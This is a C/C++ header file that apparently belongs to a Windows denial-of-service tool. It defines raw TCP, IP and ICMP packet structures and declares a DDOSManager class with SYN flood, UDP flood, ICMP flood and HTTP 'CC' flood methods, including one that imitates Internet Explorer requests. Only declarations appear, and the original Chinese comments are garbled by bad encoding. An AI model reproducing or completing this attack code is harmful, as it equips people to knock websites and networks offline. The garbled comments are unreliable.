/********************************************************************
	created:	2010/12/26
	created:	26:12:2010   22:50
	filename: 	D:\�ս���\Server\DDOSManager.h
	file path:	D:\�ս���\Server
	file base:	DDOSManager
	file ext:	h
	author:		
	
	purpose:	
*********************************************************************/


#ifndef DDOSManager_h__
#define DDOSManager_h__
#include <stdlib.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include "macros.h"
#include <Wininet.h>
#pragma comment(lib,"Wininet.lib")


typedef struct tcphdr			//tcpͷ
{
	USHORT th_sport;			//16λԴ�˿�
	USHORT th_dport;			//16λĿ�Ķ˿�
	unsigned int th_seq;		//32λ���к�
	unsigned int th_ack;		//32λȷ�Ϻ�
	unsigned char th_lenres;	//4λ�ײ�����+6λ�������е�4λ
	unsigned char th_flag;		//2λ������+6λ��־λ
	USHORT th_win;				//16λ���ڴ�С
	USHORT th_sum;				//16λУ���
	USHORT th_urp;				//16λ��������ƫ����
}TCP_HEADER;

typedef struct _iphdr				//ipͷ
{ 
	unsigned char h_verlen;			//4λ�ײ�����+4λIP�汾�� 
	unsigned char tos;				//8λ��������TOS 
	unsigned short total_len;		//16λ�ܳ��ȣ��ֽڣ� 
	unsigned short ident;			//16λ��ʶ 
	unsigned short frag_and_flags;	//3λ��־λ 
	unsigned char ttl;				//8λ����ʱ��TTL 
	unsigned char proto;			//8λЭ���(TCP, UDP ������) 
	unsigned short	checksum;		//16λIP�ײ�У��� 
	unsigned int sourceIP;			//32λԴIP��ַ 
	unsigned int destIP;			//32λĿ��IP��ַ 
}IP_HEADER;

typedef struct tsd_hdr
{ 
	unsigned long  saddr;
	unsigned long  daddr;
	char           mbz; 
	char           ptcl;
	unsigned short tcpl;
}PSD_HEADER; 

typedef struct _icmphdr				//����ICMP�ײ�
{
	BYTE   i_type;					//8λ����
	BYTE   i_code;					//8λ����
	USHORT i_cksum;					//16λУ��� 
	USHORT i_id;					//ʶ��ţ�һ���ý��̺���Ϊʶ��ţ�
	USHORT i_seq;					//�������к�	
	ULONG  timestamp;				//ʱ���
}ICMP_HEADER;


#define ICMP_ECHO         8
#define MAX_PACKET       4096

class DDOSManager
{
public:
	DDOSManager(LPATTACK PoinParam);
	static DWORD ResolvDNS(LPSTR szTarget);
	static DWORD CreateRandNum(WORD Min=0,WORD Max=0);
	static DWORD WINAPI CCAttack(LPVOID lParam);
	static DWORD WINAPI ImitateIERequst(LPVOID lParam);
	static DWORD WINAPI LoopCCAttack(LPVOID lParam);
	static DWORD WINAPI CreateTimeer(LPVOID lParam);
	static void Fill_ICMP_Data(char *icmp_data, int datasize);
	static DWORD WINAPI ICMP_Flood(LPVOID lParam);
	static DWORD WINAPI UDPAttackModel(LPVOID lParam);
	static DWORD WINAPI SYNFlood(LPVOID lParam);
protected:
	static DWORD CountTime;
private:
	ATTACK m_Attack;
};


#endif // DDOSManager_h__